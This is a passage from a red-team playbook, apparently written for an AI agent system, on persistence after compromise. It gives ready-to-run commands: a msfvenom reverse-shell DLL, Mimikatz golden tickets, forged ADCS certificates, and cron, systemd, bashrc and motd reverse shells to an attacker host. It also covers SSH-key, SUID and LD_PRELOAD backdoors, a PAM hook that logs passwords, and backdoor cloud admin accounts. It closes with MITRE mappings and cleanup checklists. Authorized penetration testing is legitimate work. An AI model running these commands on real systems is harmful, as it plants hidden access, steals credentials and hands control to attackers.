# Create malicious DLL (Metasploit)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ATTACKER_IP LPORT=$LPORT \
  -f dll -o missing_dependency.dll

# Place DLL
copy missing_dependency.dll "C:\Program Files\VulnerableApp\missing_dependency.dll"

# Next service restart / application launch = DLL loaded
```

#### Golden Ticket (Domain-Level Persistence)

```powershell
# Requires: krbtgt hash + domain SID (from DCSync or NTDS.dit)

# Get domain SID
[System.Security.Principal.WindowsIdentity]::GetCurrent().User.AccountDomainSid.Value

# Create golden ticket (Mimikatz)
mimikatz "kerberos::golden /user:Administrator /domain:$DOMAIN \
  /sid:$DOMAIN_SID /krbtgt:$KRBTGT_HASH /ptt" exit

# Create golden ticket (Impacket)
ticketer.py -nthash $KRBTGT_HASH -domain-sid $DOMAIN_SID \
  -domain $DOMAIN Administrator

# Use ticket
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass $DOMAIN/Administrator@$DC_IP

# Golden ticket valid until krbtgt password reset (typically 2 resets needed to invalidate)
```

#### ADCS Golden Certificate

```powershell
# After compromising CA server — extract CA cert + private key
certutil -exportPFX -user MY $CA_CN C:\temp\ca.pfx

# Forge certificate for any user
ForgeCert.exe \
  --CaCertPath C:\temp\ca.pfx \
  --CaCertPassword "$CA_PASS" \
  --Subject "CN=Administrator" \
  --SubjectAltName "administrator@$DOMAIN" \
  --NewCertPath C:\temp\admin.pfx \
  --NewCertPassword "$CERT_PASS"

# Use forged cert for Kerberos TGT
Rubeus.exe asktgt \
  /user:administrator \
  /certificate:C:\temp\admin.pfx \
  /password:$CERT_PASS \
  /ptt

# Valid as long as CA cert not changed — extremely stealthy persistence
```

---

### 7.2 Linux Persistence

**Prerequisites:** Shell access (user or root depending on technique)

#### Crontab

```bash
# User crontab persistence
crontab -e
# Add:
*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/$ATTACKER_IP/$LPORT 0>&1'
@reboot sleep 60 && ncat $ATTACKER_IP $LPORT -e /bin/bash

# System crontab (root required)
echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/$ATTACKER_IP/$LPORT 0>&1'" \
  >> /etc/crontab

# Drop in cron.d
echo "*/5 * * * * root /tmp/.backdoor" > /etc/cron.d/syscheck
chmod 644 /etc/cron.d/syscheck

# cron.daily/hourly (runs as root)
echo '/tmp/.backdoor &' >> /etc/cron.daily/logrotate

# Cleanup
crontab -r    # Remove own crontab
# Or: crontab -e and manually remove entry
```

#### SSH Keys

```bash
# Add attacker's public key to target's authorized_keys
mkdir -p ~/.ssh
chmod 700 ~/.ssh
echo "ssh-rsa $ATTACKER_PUBKEY attacker@kali" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Root authorized_keys
echo "ssh-rsa $ATTACKER_PUBKEY" >> /root/.ssh/authorized_keys

# Generate dedicated backdoor keypair
ssh-keygen -t ed25519 -f /tmp/bd_key -N ""
cat /tmp/bd_key.pub >> ~/.ssh/authorized_keys
# Keep /tmp/bd_key private key on attacker

# Access
ssh -i /tmp/bd_key $USERNAME@$TARGET_IP

# Cleanup
sed -i '/attacker@kali/d' ~/.ssh/authorized_keys
```

#### Systemd Services

```bash
# System service (root required — survives reboot)
cat > /etc/systemd/system/systemd-resolve-helper.service << EOF
[Unit]
Description=DNS Resolution Helper
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/$ATTACKER_IP/$LPORT 0>&1'
Restart=on-failure
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

systemctl enable systemd-resolve-helper
systemctl start systemd-resolve-helper

# User service (no root — runs at user login)
mkdir -p ~/.config/systemd/user/
cat > ~/.config/systemd/user/user-sync.service << EOF
[Unit]
Description=User Sync Service

[Service]
ExecStart=/tmp/.backdoor
Restart=always
RestartSec=60

[Install]
WantedBy=default.target
EOF

systemctl --user enable user-sync.service
systemctl --user start user-sync.service

# Cleanup
systemctl disable systemd-resolve-helper
systemctl stop systemd-resolve-helper
rm /etc/systemd/system/systemd-resolve-helper.service
systemctl daemon-reload
```

#### Shell Profile Backdoors

```bash
# ~/.bashrc (interactive non-login bash)
echo "nohup bash -i >& /dev/tcp/$ATTACKER_IP/$LPORT 0>&1 &" >> ~/.bashrc

# ~/.bash_profile (login bash)
echo "nohup bash -i >& /dev/tcp/$ATTACKER_IP/$LPORT 0>&1 &" >> ~/.bash_profile

# ~/.profile (POSIX login shell)
echo "/tmp/.backdoor &" >> ~/.profile

# /etc/profile.d/ (root required, all users at login)
echo "bash -i >& /dev/tcp/$ATTACKER_IP/$LPORT 0>&1 &" \
  > /etc/profile.d/sysupdate.sh
chmod +x /etc/profile.d/sysupdate.sh

# Motd (triggers on SSH login)
echo "/bin/bash -c 'bash -i >& /dev/tcp/$ATTACKER_IP/$LPORT 0>&1 &'" \
  >> /etc/update-motd.d/00-header

# Cleanup
sed -i '/ATTACKER_IP/d' ~/.bashrc ~/.bash_profile ~/.profile
rm /etc/profile.d/sysupdate.sh
```

#### SUID Backdoor

```bash
# Create SUID bash (root required)
cp /bin/bash /tmp/.bash_suid
chmod +s /tmp/.bash_suid

# Execute (any user on system)
/tmp/.bash_suid -p    # -p preserves SUID privileges → root shell

# Cleanup (requires root to remove)
rm /tmp/.bash_suid
```

#### LD_PRELOAD Persistence

```bash
# Create malicious shared library
cat > /tmp/backdoor.c << 'EOF'
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

__attribute__((constructor)) void backdoor() {
    if (fork() == 0) {
        // Background shell
        sleep(2);
        execl("/bin/bash", "bash", "-c",
          "bash -i >& /dev/tcp/ATTACKER_IP/LPORT 0>&1", NULL);
    }
}
EOF

gcc -shared -fPIC -o /tmp/libsys.so /tmp/backdoor.c

# Add to ld.so.preload (root required — loads with EVERY process)
echo "/tmp/libsys.so" >> /etc/ld.so.preload

# Cleanup
sed -i '/libsys.so/d' /etc/ld.so.preload
rm /tmp/libsys.so
```

#### PAM Backdoor

```bash
# Add backdoor to PAM auth (root required)
# Any password works for the backdoored service

# pam_any_password module approach:
# Or: patch /etc/pam.d/sshd to add debug logging (captures all passwords)
cat >> /etc/pam.d/sshd << EOF
auth required pam_exec.so /tmp/log_auth.sh
EOF

cat > /tmp/log_auth.sh << 'EOF'
#!/bin/bash
echo "$(date) USER=$PAM_USER PASS=$AUTH_TOKEN" >> /tmp/.auth_log
exit 0
EOF
chmod +x /tmp/log_auth.sh

# Cleanup
sed -i '/log_auth.sh/d' /etc/pam.d/sshd
rm /tmp/log_auth.sh /tmp/.auth_log
```

---

### 7.3 Network-Level Persistence

#### VPN Account Creation

```bash
# AWS VPN — create backdoor IAM user
aws iam create-user --user-name svc-backup-agent
aws iam create-access-key --user-name svc-backup-agent
aws iam attach-user-policy --user-name svc-backup-agent \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Azure — create backdoor service principal
az ad sp create-for-rbac --name "backup-agent" --role Owner \
  --scopes /subscriptions/$SUBSCRIPTION_ID

# On-prem: Create VPN user (if VPN uses AD auth)
net user vpn_backup $PASSWORD /add /domain
net group "VPN Users" vpn_backup /add /domain
```

#### DNS Record Manipulation

```bash
# Add DNS record pointing to attacker infrastructure
# (Requires DNS admin access)

# Windows DNS (PowerShell)
Add-DnsServerResourceRecordA -Name "vpn-backup" -ZoneName "$DOMAIN" \
  -IPv4Address "$ATTACKER_IP"

# Bind DNS zone edit
# Add A record to zone file: vpn-backup IN A $ATTACKER_IP

# AdidnsDump + modify (ADIDNS via LDAP)
# Use python script to add DNS record via LDAP
```

#### Firewall Rule Persistence

```bash
# Windows: add allow rule
netsh advfirewall firewall add rule \
  name="Windows Management" \
  protocol=TCP \
  dir=in \
  localport=$LPORT \
  action=allow

# Linux iptables
iptables -A INPUT -p tcp --dport $LPORT -j ACCEPT
iptables-save > /etc/iptables/rules.v4

# Cleanup
netsh advfirewall firewall delete rule name="Windows Management"
iptables -D INPUT -p tcp --dport $LPORT -j ACCEPT
```

---

## Appendix A: MITRE ATT&CK Quick Reference

| Technique | ID | Tools |
|---|---|---|
| C2 via HTTP/S | T1071.001 | CS, Sliver, Havoc, Mythic |
| C2 via DNS | T1071.004 | CS DNS, Sliver DNS, dnscat2 |
| Encrypted Channel | T1573 | All modern C2 frameworks |
| Protocol Tunneling | T1572 | Chisel, Ligolo-ng, SSH tunnels |
| SMB/WinRM Lateral Movement | T1021.002, T1021.006 | netexec, evil-winrm, impacket |
| RDP | T1021.001 | xfreerdp, crowbar |
| SSH Lateral Movement | T1021.004 | ssh, hydra |
| NTLM Relay | T1557.001 | Responder, ntlmrelayx |
| Network Scanning | T1046 | nmap, masscan, netdiscover |
| Data Exfiltration over HTTP | T1041 | curl, PowerShell, certutil |
| DNS Exfiltration | T1048.003 | dnscat2, iodine, xxd pipe |
| ICMP Exfiltration | T1048.003 | icmpsh, ptunnel |
| LOL Exfiltration | T1048 | certutil, bitsadmin, /dev/tcp |
| Registry Run Keys | T1547.001 | reg.exe, SharPersist |
| Scheduled Tasks | T1053.005 | schtasks, Register-ScheduledTask |
| WMI Persistence | T1546.003 | wmic, PowerShell WMI |
| Service Creation | T1543.003 | sc.exe, New-Service |
| BITS Jobs | T1197 | bitsadmin |
| DLL Hijacking | T1574.001 | msfvenom |
| Linux Crontab | T1053.003 | crontab |
| SSH Keys | T1098.004 | ssh-keygen |
| Systemd Service | T1543.002 | systemctl |
| SUID | T1548.001 | cp /bin/bash + chmod +s |
| Golden Ticket | T1558.001 | Mimikatz, impacket ticketer |

---

## Appendix B: Evidence Collection Templates

### Report Evidence Checklist (Per Technique)

```
C2 Framework:
[ ] Screenshot of beacon/session established
[ ] Command output: whoami /all, hostname, ipconfig /all
[ ] Network capture showing C2 beaconing (anonymized)
[ ] Screenshot of team server console

Network Service Exploitation:
[ ] nmap scan output (service version, vuln scripts)
[ ] Proof of access (interactive session screenshot)
[ ] Command execution output (whoami, id, hostname)
[ ] File access proof (sensitive file listing or download)

Pivoting:
[ ] Screenshot of tool connecting to internal subnet
[ ] nmap or tool output against internal hosts (unreachable from outside)
[ ] Traceroute showing hop through pivot

Data Exfiltration:
[ ] Transfer log (attacker-side receipt)
[ ] Hash of exfiltrated data (MD5/SHA256 of files)
[ ] Screenshot of sensitive data accessed (redact actual content for report)

Persistence:
[ ] Before/after state: registry key added, task created, service installed
[ ] Persistence mechanism triggered (screenshot of shell connecting back)
[ ] Method used to verify persistence survives reboot
```

---

## Appendix C: Cleanup Verification Checklist

```
ALWAYS verify cleanup after each engagement component:

C2:
[ ] All beacons killed (beacon> exit)
[ ] Dropped executables removed (C:\Windows\Temp\*, /tmp/.*)
[ ] Staged payloads deleted from web servers
[ ] SSH tunnels closed

Network Service Exploitation:
[ ] SMB shares unmounted (sudo umount /mnt/share)
[ ] xp_cmdshell disabled in MSSQL
[ ] No shells left running on target

Pivoting:
[ ] Chisel/Ligolo/socat processes killed on pivot hosts
[ ] Dropped tunnel binaries removed
[ ] netsh portproxy rules removed (netsh interface portproxy reset)
[ ] Ligolo tun interfaces removed (sudo ip tuntap del name ligolo mode tun)

Persistence:
[ ] Registry Run keys removed
[ ] Scheduled tasks deleted
[ ] Services stopped and deleted
[ ] WMI subscriptions removed
[ ] Cron entries removed
[ ] SSH keys removed from authorized_keys
[ ] systemd services disabled and unit files deleted
[ ] SUID files removed
[ ] Golden tickets expired / invalidated (DC notified)

Wireless:
[ ] Monitor mode disabled (airmon-ng stop wlan0mon)
[ ] Evil twin AP shutdown (pkill hostapd-mana)
[ ] dnsmasq stopped

General:
[ ] Tool binaries removed from target systems
[ ] Log entries documented (provide to blue team if agreed)
[ ] Scan/capture files stored in $OUTPUT_DIR (not on target)
```

---

**Playbook maintained by:** ATHENA Agent Knowledge System — ZeroK Labs
**Source attribution:** HackTricks (book.hacktricks.xyz), InternalAllTheThings MIT (swisskyrepo), Atomic Red Team MIT (redcanaryco)
**Version:** 1.0 | **Date:** 2026-02-26
